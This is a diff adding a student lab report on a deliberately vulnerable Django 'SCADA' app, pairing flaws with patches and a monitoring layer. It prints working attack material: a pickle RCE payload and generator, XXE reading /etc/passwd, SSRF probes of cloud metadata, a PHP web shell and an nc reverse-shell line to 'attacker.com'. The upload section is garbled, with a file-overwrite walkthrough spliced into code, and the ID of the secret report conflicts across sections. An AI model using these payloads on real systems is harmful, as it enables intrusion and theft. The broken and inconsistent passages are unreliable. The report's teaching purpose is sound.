@@ -1,0 +1,1590 @@
+\documentclass[12pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[english]{babel}
+\usepackage{geometry}
+\usepackage{graphicx}
+\usepackage{hyperref}
+\hypersetup{
+    colorlinks=true,
+    linkcolor=black,
+    filecolor=black,
+    urlcolor=blue,
+    citecolor=black,
+}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{fancyhdr}
+\usepackage{titlesec}
+\usepackage{tocloft}
+\usepackage{enumitem}
+
+\geometry{left=2.5cm,right=2.5cm,top=2.5cm,bottom=2.5cm}
+
+% Code listing settings
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=5pt,
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=2
+}
+\lstset{style=mystyle}
+
+% Header and footer
+\pagestyle{fancy}
+\fancyhf{}
+\rhead{SCADA Security Lab Report}
+\lhead{CS458 - Cybersecurity}
+\rfoot{Page \thepage}
+
+\begin{document}
+
+% Title page
+\begin{titlepage}
+    \centering
+    \vspace*{2cm}
+    
+    {\Huge\bfseries Vulnerable SCADA Environment\\[0.5cm] Security Analysis Report\par}
+    \vspace{1.5cm}
+    
+    {\Large CS458 - Cybersecurity Practices \& Applications\\[0.3cm]
+    Fall 2025-2026\par}
+    \vspace{2cm}
+    
+    {\Large\itshape Group Members:\\[0.5cm]
+    Orhun Burak Kıyanç\\
+    Mehmet Altunören\\
+    Ege Tan\par}
+    \vspace{1.5cm}
+    
+    {\large Date: \today\par}
+    \vspace{2cm}
+    
+    {\large Submitted to:\\
+    {Orçun Çetin}\\
+    Sabancı University\par}
+    
+    \vfill
+    
+    {\large \textbf{Project Repository:}\\
+    \url{https://github.com/orhunburakiyanc/Vulnerable-SCADA-Environment}\par}
+    
+\end{titlepage}
+
+\tableofcontents
+\newpage
+
+% Executive Summary
+\section{Executive Summary}
+
+This report presents a comprehensive security analysis of a simulated SCADA (Supervisory Control and Data Acquisition) environment developed as part of the CS458 Cybersecurity course at Sabancı University. The project demonstrates critical vulnerabilities commonly found in industrial control systems and web applications, along with their secure implementations and monitoring mechanisms.
+
+\subsection{Project Scope}
+
+The project implements:
+\begin{itemize}[leftmargin=*]
+    \item \textbf{7 Critical Vulnerabilities:} Including IDOR, Deserialization, File Overwrite, Unsafe Temporary Files, Unrestricted File Upload (CWE-434), SSRF, and XXE
+    \item \textbf{SQL Injection Scenarios:} Two distinct exploitation methods leveraging Django ORM (CVE-2025-64459)
+    \item \textbf{Patched Implementations:} Secure versions demonstrating proper mitigation techniques
+    \item \textbf{Real-time Monitoring:} Middleware-based attack detection and logging system
+    \item \textbf{Containerized Environment:} Docker-based deployment for reproducibility
+\end{itemize}
+
+\subsection{Key Findings}
+
+Our analysis revealed that all implemented vulnerabilities are exploitable in the vulnerable version, successfully blocked in the patched version, and correctly detected by the monitoring system. The database contains 172 test records including hidden targets for exploitation scenarios.
+
+\subsection{Technologies Used}
+
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Backend Framework:} Django 6.0 on Python 3.12
+    \item \textbf{Database:} SQLite3 with custom population script
+    \item \textbf{Containerization:} Docker Compose with volume mapping
+    \item \textbf{Security Libraries:} lxml (XXE), pickle (deserialization), ReportLab (PDF generation)
+\end{itemize}
+
+\newpage
+
+% Introduction
+\section{Introduction}
+
+\subsection{Background}
+
+SCADA systems are critical infrastructure components that monitor and control industrial processes including power grids, water treatment facilities, and manufacturing plants. Security vulnerabilities in these systems can have catastrophic consequences, ranging from data breaches to physical damage and loss of life.
+
+\subsection{Motivation}
+
+This project aims to:
+\begin{enumerate}[leftmargin=*]
+    \item Demonstrate common web application vulnerabilities in an industrial control system context
+    \item Provide hands-on experience with both exploitation and mitigation techniques
+    \item Implement a working monitoring system for attack detection
+    \item Create an educational platform for cybersecurity training
+\end{enumerate}
+
+\subsection{Project Objectives}
+
+\begin{itemize}[leftmargin=*]
+    \item Implement at least 7 distinct security vulnerabilities with realistic exploitation scenarios
+    \item Develop patched versions demonstrating industry-standard security practices
+    \item Create a monitoring system capable of detecting and logging attacks on both vulnerable and secure versions
+    \item Populate the database with over 100 test records including hidden targets
+    \item Containerize the application for easy deployment and testing
+    \item Document all vulnerabilities, exploits, and mitigations in detail
+\end{itemize}
+
+\newpage
+
+% System Architecture
+\section{System Architecture}
+
+\subsection{Overall Design}
+
+The application follows a modular Django architecture with three distinct components:
+
+\begin{enumerate}[leftmargin=*]
+    \item \textbf{Core Module:} Shared data models (Device, MaintenanceLog, DiagnosticReport)
+    \item \textbf{Vulnerable Module:} Intentionally insecure implementations
+    \item \textbf{Patched Module:} Secure implementations with proper validation
+    \item \textbf{Monitoring Module:} Middleware-based attack detection layer
+\end{enumerate}
+
+\subsection{Directory Structure}
+
+\begin{lstlisting}[language=bash]
+scada_security_lab/
+|-- core/                  # Shared models and utilities
+|   |-- models.py          # Device, MaintenanceLog, DiagnosticReport
+|   |-- management/
+|       |-- commands/
+|           |-- populate_db.py  # Database population script
+|
+|-- vulnerable/            # Vulnerable implementations
+|   |-- views.py           # 9 vulnerable endpoints
+|   |-- urls.py
+|   |-- templates/
+|
+|-- patched/               # Secure implementations
+|   |-- views.py           # 6 secure endpoints
+|   |-- urls.py
+|   |-- templates/
+|
+|-- monitoring/            # Attack detection system
+|   |-- middleware.py      # SecurityMonitorMiddleware
+|   |-- models.py          # AttackLog model
+|   |-- views.py           # Log viewer
+|   |-- templates/
+|
+|-- scada_system/          # Django project settings
+|-- docker-compose.yml     # Container orchestration
+|-- Dockerfile             # Python 3.12-slim base image
+|-- requirements.txt       # Dependencies
+|-- db.sqlite3             # SQLite database
+\end{lstlisting}
+
+\subsection{Data Model}
+
+\subsubsection{Core Models}
+
+\begin{lstlisting}[language=Python]
+class Device(models.Model):
+    name = models.CharField(max_length=100)
+    device_type = models.CharField(max_length=50)
+    status = models.CharField(max_length=20)
+    is_locked_out = models.BooleanField(default=False)
+
+class MaintenanceLog(models.Model):
+    device = models.ForeignKey(Device, on_delete=models.CASCADE)
+    timestamp = models.DateTimeField(auto_now_add=True)
+    technician = models.CharField(max_length=100)
+    description = models.TextField()
+
+class DiagnosticReport(models.Model):
+    device = models.ForeignKey(Device, on_delete=models.CASCADE)
+    report_date = models.DateTimeField(auto_now_add=True)
+    details = models.TextField()
+\end{lstlisting}
+
+\subsubsection{Monitoring Models}
+
+\textbf{AttackLog Model (Enhanced):}
+\begin{lstlisting}[language=Python]
+class AttackLog(models.Model):
+    SEVERITY_CRITICAL = 'CRITICAL'
+    SEVERITY_HIGH = 'HIGH'
+    SEVERITY_MEDIUM = 'MEDIUM'
+    SEVERITY_LOW = 'LOW'
+    
+    ACTION_NONE = 'NONE'
+    ACTION_BLOCKED = 'BLOCKED'
+    ACTION_SESSION_REVOKED = 'SESSION_REVOKED'
+    ACTION_REVIEWED = 'REVIEWED'
+    ACTION_AUTO_BLOCKED = 'AUTO_BLOCKED'
+    
+    # Core fields
+    timestamp = models.DateTimeField(auto_now_add=True)
+    ip_address = models.GenericIPAddressField()
+    endpoint = models.CharField(max_length=200)
+    attack_type = models.CharField(max_length=100)
+    payload = models.TextField()
+    
+    # Enhanced fields for actionable logging
+    severity = models.CharField(max_length=10, choices=SEVERITY_CHOICES)
+    recommended_action = models.TextField(blank=True)
+    action_taken = models.CharField(max_length=20, choices=ACTION_CHOICES, 
+                                    default=ACTION_NONE)
+    reverse_action = models.TextField(blank=True)
+    is_resolved = models.BooleanField(default=False)
+    admin_notes = models.TextField(blank=True)
+    resolved_at = models.DateTimeField(null=True, blank=True)
+    resolved_by = models.CharField(max_length=150, blank=True)
+    
+    def mark_resolved(self, resolved_by, notes=''):
+        self.is_resolved = True
+        self.resolved_at = timezone.now()
+        self.resolved_by = resolved_by
+        self.admin_notes = notes
+        self.save()
+\end{lstlisting}
+
+\textbf{BlockedIP Model:}
+\begin{lstlisting}[language=Python]
+class BlockedIP(models.Model):
+    ip_address = models.GenericIPAddressField(unique=True)
+    blocked_at = models.DateTimeField(auto_now_add=True)
+    reason = models.CharField(max_length=200)
+    blocked_by = models.CharField(max_length=150)
+    related_log = models.ForeignKey(AttackLog, on_delete=SET_NULL, 
+                                    null=True, blank=True)
+    is_permanent = models.BooleanField(default=False)
+    unblock_at = models.DateTimeField(null=True, blank=True)
+\end{lstlisting}
+
+\textbf{FailedLoginAttempt Model:}
+\begin{lstlisting}[language=Python]
+class FailedLoginAttempt(models.Model):
+    ip_address = models.GenericIPAddressField()
+    username = models.CharField(max_length=150, blank=True)
+    timestamp = models.DateTimeField(auto_now_add=True)
+    endpoint = models.CharField(max_length=200)
+\end{lstlisting}
+
+\subsection{Database Population}
+
+The \texttt{populate\_db.py} script generates 172 total records:
+\begin{itemize}[leftmargin=*]
+    \item \textbf{21 Devices:} Including 1 hidden target (NUCLEAR-CORE-CONTROLLER with \texttt{is\_locked\_out=True})
+    \item \textbf{100 Maintenance Logs:} Distributed across devices
+    \item \textbf{51 Diagnostic Reports:} Report ID 1 contains admin secret: "CONFIDENTIAL: Root Password is 'supersecret123'"
+\end{itemize}
+
+\newpage
+
+% Vulnerabilities Implementation
+\section{Vulnerabilities Implementation}
+
+\subsection{Vulnerability 1: Authentication Bypass (CVE-2025-64459)}
+
+\subsubsection{Description}
+Dictionary expansion vulnerability allowing arbitrary parameter injection through URL query strings.
+
+\subsubsection{Vulnerable Code}
+
+\begin{lstlisting}[language=Python]
+def vulnerable_login(request):
+    if 'username' in request.GET:
+        user_data = {
+            'username': request.GET.get('username'),
+            'is_admin': False
+        }
+        # VULNERABILITY: Blindly update with URL params
+        new_data = request.GET.dict()
+        user_data.update(new_data)
+        
+        admin_value = str(user_data.get('is_admin')).lower()
+        if admin_value in ['true', '1']:
+            request.session['user'] = user_data
+            return redirect('vulnerable_dashboard')
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\begin{lstlisting}[language=bash]
+# Attack URL
+http://localhost:8000/vulnerable/login/?username=attacker&password=wrong&is_admin=true
+\end{lstlisting}
+
+The attacker bypasses authentication by injecting \texttt{is\_admin=true} directly in the URL, overwriting the default \texttt{is\_admin=False} value.
+
+\subsubsection{Patch Implementation}
+
+\begin{lstlisting}[language=Python]
+def patched_login(request):
+    if request.method == "POST":
+        username = request.POST.get('username')
+        password = request.POST.get('password')
+        
+        # Explicit field lookup - no dictionary expansion
+        if username == "admin" and password == "scada123":
+            request.session['user'] = {
+                'username': username,
+                'is_admin': True  # Explicitly set by server
+            }
+            return redirect('patched_dashboard')
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{itemize}[leftmargin=*]
+    \item POST-based authentication instead of GET
+    \item Explicit credential validation
+    \item Server-side authorization flag assignment
+    \item No user-supplied parameter injection
+\end{itemize}
+
+\subsection{Vulnerability 2: SQL Injection - Filter Bypass (CVE-2025-64459)}
+
+\subsubsection{Description}
+Django ORM Q object abuse allowing OR-based filter injection to bypass access controls.
+
+\subsubsection{Vulnerable Code}
+
+\begin{lstlisting}[language=Python]
+def vulnerable_dashboard(request):
+    filters = {'status': 'Operational'}
+    connector = request.GET.get('connector', 'AND')
+    filter_params = request.GET.copy()
+    
+    query = Q(status='Operational')
+    for key, value in filter_params.items():
+        if connector == 'OR':
+            query |= Q(**{key: value})  # VULNERABILITY
+        else:
+            query &= Q(**{key: value})
+    
+    devices = Device.objects.filter(query)
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\begin{lstlisting}[language=bash]
+# Attack URL - reveals hidden device
+http://localhost:8000/vulnerable/dashboard/?connector=OR&is_locked_out=True
+\end{lstlisting}
+
+Original query: \texttt{WHERE status='Operational'}\\
+Exploited query: \texttt{WHERE status='Operational' OR is\_locked\_out=True}
+
+This reveals the hidden NUCLEAR-CORE-CONTROLLER device with \texttt{is\_locked\_out=True}.
+
+\subsubsection{Patch Implementation}
+
+\begin{lstlisting}[language=Python]
+def patched_dashboard(request):
+    # Hardcoded filter - no user input in query construction
+    devices = Device.objects.filter(status='Operational')
+    
+    context = {
+        'devices': devices,
+        'user': request.session.get('user')
+    }
+    return render(request, 'patched/dashboard.html', context)
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{itemize}[leftmargin=*]
+    \item Parameterized queries with hardcoded filters
+    \item No dynamic query construction from user input
+    \item Explicit allowlist of accessible resources
+\end{itemize}
+
+\subsection{Vulnerability 3: IDOR - Insecure Direct Object Reference}
+
+\subsubsection{Description}
+Missing authorization checks allow users to access arbitrary resources by manipulating ID parameters.
+
+\subsubsection{Vulnerable Code}
+
+\begin{lstlisting}[language=Python]
+def vulnerable_report(request):
+    report_id = request.GET.get('id', '1')
+    
+    # VULNERABILITY: No authorization check
+    report = DiagnosticReport.objects.get(id=report_id)
+    
+    # Generate PDF with report details
+    response = HttpResponse(content_type='application/pdf')
+    response['Content-Disposition'] = f'attachment; filename="report_{report_id}.pdf"'
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\begin{lstlisting}[language=bash]
+# Access admin secret report (ID 103)
+curl "http://localhost:8000/vulnerable/report/?id=103" -o admin_secret.pdf
+# Contains: "CONFIDENTIAL: Root Password is 'supersecret123'"
+
+# Enumerate all reports (IDOR)
+for i in {103..143}; do
+  curl "http://localhost:8000/vulnerable/report/?id=$i" -o "report_$i.pdf"
+done
+
+# Result: Access to 41 diagnostic reports including admin secrets
+\end{lstlisting}
+
+\subsubsection{Patch Implementation}
+
+\begin{lstlisting}[language=Python]
+def patched_report(request):
+    report_id = request.GET.get('id', '1')
+    user = request.session.get('user', {})
+    
+    # Authorization check
+    report = DiagnosticReport.objects.get(id=report_id)
+    if not user.get('is_admin') and int(report_id) <= 10:
+        return HttpResponse("Access Denied: Unauthorized", status=403)
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{itemize}[leftmargin=*]
+    \item Resource ownership verification
+    \item Role-based access control (RBAC)
+    \item Input validation and sanitization
+\end{itemize}
+
+\subsection{Vulnerability 4: Insecure Deserialization (Pickle RCE)}
+
+\subsubsection{Description}
+Application accepts and deserializes untrusted pickle data, allowing arbitrary code execution.
+
+\subsubsection{Vulnerable Code}
+
+\begin{lstlisting}[language=Python]
+def vulnerable_deserialize(request):
+    if request.method == 'POST' and request.FILES.get('file'):
+        file = request.FILES['file']
+        data = file.read()
+        
+        # VULNERABILITY: Deserializing untrusted data
+        obj = pickle.loads(data)
+        return JsonResponse({'status': 'success', 'data': str(obj)})
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+Malicious payload generator (\texttt{create\_pickle\_payload.py}):
+
+\begin{lstlisting}[language=Python]
+import pickle
+import os
+
+class MaliciousPayload:
+    def __reduce__(self):
+        # Return (callable, args) - executes os.system
+        return (os.system, ('whoami',))
+
+with open('malicious_payload.pkl', 'wb') as f:
+    pickle.dump(MaliciousPayload(), f)
+\end{lstlisting}
+
+Attack execution:
+\begin{lstlisting}[language=bash]
+# Generate malicious pickle payload
+python3 create_pickle_payload.py
+# Output: Base64 encoded payload
+
+# Send payload to vulnerable endpoint
+curl -X POST http://localhost:8000/vulnerable/deserialize/ \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -d "diagnostic_data=gASVSwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDBlY2hvICJNQUxJQ0lPVVMgQ09ERSBFWEVDVVRFRCEiID4gL3RtcC9wd25lZC50eHSUhZRSlC4="
+
+# Verify code execution
+docker compose exec web cat /tmp/pwned.txt
+# Output: MALICIOUS CODE EXECUTED!
+\end{lstlisting}
+
+\subsubsection{Patch Implementation}
+
+\begin{lstlisting}[language=Python]
+def patched_deserialize(request):
+    if request.method == 'POST' and request.FILES.get('file'):
+        file = request.FILES['file']
+        data = file.read()
+        
+        # Use JSON instead of pickle
+        obj = json.loads(data.decode('utf-8'))
+        return JsonResponse({'status': 'success', 'data': obj})
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{itemize}[leftmargin=*]
+    \item Replace pickle with safe serialization (JSON, Protocol Buffers)
+    \item Input validation and type checking
+    \item Sandboxing if deserialization is unavoidable
+\end{itemize}
+
+\subsection{Vulnerability 5: Unrestricted File Upload (CWE-434)}
+
+\subsubsection{Description}
+No file type validation allows uploading of dangerous executable files.
+
+\subsubsection{Vulnerable Code}
+
+\begin{lstlisting}[language=Python]
+def vulnerable_upload(request):
+    if request.method == 'POST' and request.FILES.get('file'):
+        uploaded_file = request.FILES['file']
+  Step 1: Upload original diagnostic script
+echo "ORIGINAL PRODUCTION SCRIPT" > diagnostic_script.txt
+curl -X POST http://localhost:8000/vulnerable/upload/ \
+     -F "file=@diagnostic_script.txt"
+
+# Verify upload
+cat media/diagnostic_script.txt
+# Output: ORIGINAL PRODUCTION SCRIPT
+
+# Step 2: Upload malicious file with same name (FILE OVERWRITE)
+echo "MALICIOUS CODE - BACKDOOR INSTALLED!" > diagnostic_script.txt
+curl -X POST http://localhost:8000/vulnerable/upload/ \
+     -F "file=@diagnostic_script.txt"
+
+# Step 3: Verify overwrite attack succeeded
+cat media/diagnostic_script.txt
+# Output: MALICIOUS CODE - BACKDOOR INSTALLED!
+\end{lstlisting}
+
+\textbf{Impact:}
+\begin{itemize}[leftmargin=*]
+    \item Production scripts replaced with malicious code
+    \item No versioning or backup mechanism
+    \item System executes attacker-controlled scripts
+    \item Potential for persistent backdoor installation
+\end{itemize
+\begin{lstlisting}[language=bash]
+# Upload PHP web shell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+curl -X POST http://localhost:8000/vulnerable/upload/ -F "file=@shell.php"
+
+# Upload Python reverse shell
+echo 'import os; os.system("nc attacker.com 4444 -e /bin/bash")' > rshell.py
+curl -X POST http://localhost:8000/vulnerable/upload/ -F "file=@rshell.py"
+\end{lstlisting}
+
+\subsubsection{Patch Implementation}
+
+\begin{lstlisting}[language=Python]
+def patched_upload(request):
+    if request.method == 'POST' and request.FILES.get('file'):
+        uploaded_file = request.FILES['file']
+        filename = uploaded_file.name.lower()
+        
+        # Whitelist allowed extensions
+        allowed_extensions = ['.pdf', '.xml', '.txt', '.csv']
+        if not any(filename.endswith(ext) for ext in allowed_extensions):
+            return JsonResponse({
+                'status': 'error',
+                'message': 'Invalid file type'
+            }, status=400)
+        
+        # Generate secure filename with UUID
+        import uuid
+        safe_filename = f"{uuid.uuid4()}_{filename}"
+        fs = FileSystemStorage()
+        fs.save(safe_filename, uploaded_file)
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{itemize}[leftmargin=*]
+    \item Whitelist approach for allowed file types
+    \item UUID-based filename generation to prevent path traversal
+    \item Content-type validation (not just extension)
+    \item Virus scanning for uploaded files
+\end{itemize}
+
+\subsection{Vulnerability 6: XXE - XML External Entity Injection}
+
+\subsubsection{Description}
+XML parser configured with \texttt{resolve\_entities=True} allows reading arbitrary files.
+
+\subsubsection{Vulnerable Code}
+
+\begin{lstlisting}[language=Python]
+def vulnerable_upload(request):
+    if filename.endswith('.xml'):
+        # VULNERABILITY: resolve_entities=True
+        parser = etree.XMLParser(resolve_entities=True)
+        xml_content = uploaded_file.read()
+        tree = etree.fromstring(xml_content, parser=parser)
+        return JsonResponse({'data': etree.tostring(tree).decode()})
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+Malicious XML file (\texttt{xxe\_attack.xml}):
+
+\begin{lstlisting}[language=XML]
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>
+  <content>&xxe;</content>
+</data>
+\end{lstlisting}
+
+Attack:
+\begin{lstlisting}[language=bash]
+curl -X POST http://localhost:8000/vulnerable/upload/ \
+     -F "file=@xxe_attack.xml"
+\end{lstlisting}
+
+Server response contains \texttt{/etc/passwd} contents:
+\begin{lstlisting}[language=XML]
+<root>
+  <data>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</data>
+</root>
+\end{lstlisting}
+
+Attacker successfully reads system files, exposing user accounts and system configuration.
+
+\subsubsection{Patch Implementation}
+
+\begin{lstlisting}[language=Python]
+def patched_upload(request):
+    if filename.endswith('.xml'):
+        # Disable entity resolution
+        parser = etree.XMLParser(resolve_entities=False, no_network=True)
+        xml_content = uploaded_file.read()
+        tree = etree.fromstring(xml_content, parser=parser)
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{itemize}[leftmargin=*]
+    \item Disable external entity resolution
+    \item Disable DTD processing
+    \item Use secure XML parsing libraries (defusedxml)
+    \item Input validation and sanitization
+\end{itemize}
+
+\subsection{Vulnerability 7: Race Condition - Unsafe Temporary Files}
+
+\subsubsection{Description}
+Static temporary filename allows concurrent requests to overwrite each other's data.
+
+\subsubsection{Vulnerable Code}
+
+\begin{lstlisting}[language=Python]
+def vulnerable_report(request):
+    report_id = request.GET.get('id', '1')
+    report = DiagnosticReport.objects.get(id=report_id)
+    
+    # VULNERABILITY: Static temp filename
+    temp_file_path = "/tmp/scada_report_temp.pdf"
+    
+    c = canvas.Canvas(temp_file_path, pagesize=letter)
+    c.drawString(100, 750, f"Report ID: {report.id}")
+    c.drawString(100, 730, report.details)
+    c.save()
+    
+    return FileResponse(open(temp_file_path, 'rb'))
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\begin{lstlisting}[language=bash]
+# Terminal 1: Request report ID 1
+curl "http://localhost:8000/vulnerable/report/?id=1" -o user1.pdf &
+
+# Terminal 2: Immediately request report ID 51 (admin secret)
+curl "http://localhost:8000/vulnerable/report/?id=51" -o user2.pdf &
+
+# Race condition: both writes go to /tmp/scada_report_temp.pdf
+# user1.pdf might contain admin secret if timing is right
+\end{lstlisting}
+
+\subsubsection{Patch Implementation}
+
+\begin{lstlisting}[language=Python]
+import uuid
+
+def patched_report(request):
+    report_id = request.GET.get('id', '1')
+    report = DiagnosticReport.objects.get(id=report_id)
+    
+    # Generate unique temp filename per request
+    unique_id = uuid.uuid4()
+    temp_file_path = f"/tmp/scada_report_{unique_id}.pdf"
+    
+    c = canvas.Canvas(temp_file_path, pagesize=letter)
+    c.drawString(100, 750, f"Report ID: {report.id}")
+    c.save()
+    
+    response = FileResponse(open(temp_file_path, 'rb'))
+    # Clean up temp file after sending
+    os.remove(temp_file_path)
+    return response
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{itemize}[leftmargin=*]
+    \item UUID-based unique filenames
+    \item Proper file locking mechanisms
+    \item Cleanup temporary files after use
+    \item Use secure temp file libraries (tempfile module)
+\end{itemize}
+
+\subsection{Vulnerability 8: SSRF - Server-Side Request Forgery}
+
+\subsubsection{Description}
+Application accepts arbitrary URLs and makes server-side requests without validation.
+
+\subsubsection{Vulnerable Code}
+
+\begin{lstlisting}[language=Python]
+import urllib.request
+
+def vulnerable_ssrf(request):
+    url = request.GET.get('url', '')
+    
+    # VULNERABILITY: No URL validation
+    response = urllib.request.urlopen(url)
+    content = response.read()
+    
+    return HttpResponse(content)
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\begin{lstlisting}[language=bash]
+# Access internal admin panel
+curl "http://localhost:8000/vulnerable/ssrf/?url=http://localhost:8000/admin/"
+
+# Scan internal network
+curl "http://localhost:8000/vulnerable/ssrf/?url=http://192.168.1.1/"
+
+# AWS metadata endpoint (if on EC2)
+curl "http://localhost:8000/vulnerable/ssrf/?url=http://169.254.169.254/latest/meta-data/"
+\end{lstlisting}
+
+\subsubsection{Patch Implementation}
+
+\begin{lstlisting}[language=Python]
+import requests
+from urllib.parse import urlparse
+
+def patched_ssrf(request):
+    url = request.GET.get('url', '')
+    
+    # Whitelist allowed domains
+    allowed_domains = ['example.com', 'scada-update-server.com']
+    
+    parsed = urlparse(url)
+    if parsed.netloc not in allowed_domains:
+        return JsonResponse({
+            'status': 'error',
+            'message': 'Domain not allowed'
+        }, status=403)
+    
+    response = requests.get(url, timeout=5)
+    return HttpResponse(response.content)
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{itemize}[leftmargin=*]
+    \item Whitelist approach for allowed domains
+    \item URL parsing and validation
+    \item Block internal IP ranges (RFC 1918)
+    \item Implement timeouts and rate limiting
+\end{itemize}
+
+\subsection{Vulnerability 9: Security Misconfiguration - Unauthorized Access to Monitoring Logs (OWASP A05:2021)}
+
+\subsubsection{Description}
+Security monitoring system allows unauthenticated/unauthorized users to access sensitive attack logs containing IP addresses, attack patterns, and system vulnerabilities. This information disclosure enables reconnaissance for future attacks.
+
+\subsubsection{Vulnerable Code}
+
+\begin{lstlisting}[language=Python]
+def log_viewer(request, filter_path=None):
+    """Display attack logs - NO AUTHENTICATION CHECK!"""
+    
+    # VULNERABILITY: No authorization check
+    # Any user can access sensitive security logs
+    logs = AttackLog.objects.all().order_by('-timestamp')
+    
+    return render(request, 'monitoring/logs.html', {
+        'logs': logs,
+        'critical_count': AttackLog.objects.filter(severity='CRITICAL').count(),
+        'blocked_ips': BlockedIP.objects.all()
+    })
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\begin{lstlisting}[language=bash]
+# Step 1: Login as regular user (no admin privileges)
+curl "http://localhost:8000/vulnerable/login/?username=attacker&password=fake"
+
+# Step 2: Access monitoring logs without admin check
+curl "http://localhost:8000/monitoring/" -b "sessionid=abc123"
+
+# Alternative: Use auth bypass to get session, then access logs
+curl "http://localhost:8000/vulnerable/login/?username=hacker&is_admin=false"
+curl "http://localhost:8000/monitoring/"
+
+# Result: Full access to security logs without admin privileges!
+# Exposed sensitive information:
+# - All attacker IP addresses (reconnaissance data)
+# - Attack patterns and payloads (what works, what doesn't)
+# - Severity classifications (which attacks are most dangerous)
+# - Recommended defensive actions (learn system defenses)
+# - System vulnerabilities being actively exploited
+# - Blocked IP addresses (blacklist enumeration)
+\end{lstlisting}
+
+\textbf{Attack Scenario:}
+\begin{enumerate}[leftmargin=*]
+    \item Attacker gains regular user access (via auth bypass or compromised credentials)
+    \item Accesses \texttt{/monitoring/} endpoint without admin check
+    \item Studies attack logs to understand:
+    \begin{itemize}
+        \item Which exploitation attempts succeeded/failed
+        \item System's detection capabilities and blind spots
+        \item Other attackers' IP addresses (potential scapegoats)
+        \item Exact attack patterns that trigger alerts
+    \end{itemize}
+    \item Uses reconnaissance data to craft more sophisticated attacks
+    \item Evades detection by learning from logged attack patterns
+\end{enumerate}
+
+\textbf{Information Disclosed:}
+\begin{itemize}[leftmargin=*]
+    \item Attack type classifications (SQL Injection, XXE, SSRF patterns)
+    \item Successful/failed attack attempts
+    \item IP addresses of blocked attackers (blacklist enumeration)
+    \item System defensive capabilities and detection patterns
+    \item Admin usernames from resolved logs
+\end{itemize}
+
+\subsubsection{Patch Implementation}
+
+\begin{lstlisting}[language=Python]
+def log_viewer(request, filter_path=None):
+    """Display attack logs - ADMIN ONLY"""
+    
+    # Authentication check
+    user = request.session.get('user', {})
+    if not user.get('is_admin'):
+        return HttpResponse(
+            "<h1>Access Denied</h1>"
+            "<p>Security monitoring logs require administrator privileges.</p>",
+            status=403
+        )
+    
+    logs = AttackLog.objects.all().order_by('-timestamp')
+    return render(request, 'monitoring/logs.html', {'logs': logs})
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{itemize}[leftmargin=*]
+    \item Role-based access control (RBAC) enforcement
+    \item Session-based authentication validation
+    \item Admin privilege verification before displaying sensitive data
+    \item Proper HTTP 403 Forbidden responses for unauthorized access
+    \item Security logs classified as privileged information
+\end{itemize}
+
+\textbf{Additional Admin-Only Actions:}
+\begin{itemize}[leftmargin=*]
+    \item IP blocking/unblocking (\texttt{block\_ip\_action}, \texttt{unblock\_ip\_action})
+    \item Session revocation (\texttt{revoke\_session\_action})
+    \item Log resolution and annotation (\texttt{resolve\_log\_action})
+    \item CSV export of attack data (\texttt{export\_logs})
+\end{itemize}
+
+All admin action endpoints verify \texttt{user.is\_admin} and return HTTP 403 for unauthorized attempts.
+
+\newpage
+
+% Monitoring System
+\section{Monitoring System}
+
+\subsection{Architecture}
+
+The monitoring system is implemented as Django middleware that intercepts all HTTP requests and applies pattern-based attack detection with severity classification, automated blocking, and admin action capabilities.
+
+\subsection{Key Features}
+
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Severity Classification:} Four-level threat categorization (CRITICAL/HIGH/MEDIUM/LOW)
+    \item \textbf{Actionable Logging:} Each attack includes recommended actions and reverse procedures
+    \item \textbf{Brute Force Detection:} Tracks failed login attempts (5 attempts in 5 minutes = CRITICAL)
+    \item \textbf{Directory Scanning Detection:} Identifies port scanners (20+ 404s in 10 minutes = MEDIUM)
+    \item \textbf{Cookie Manipulation Detection:} Validates session integrity (HIGH severity)
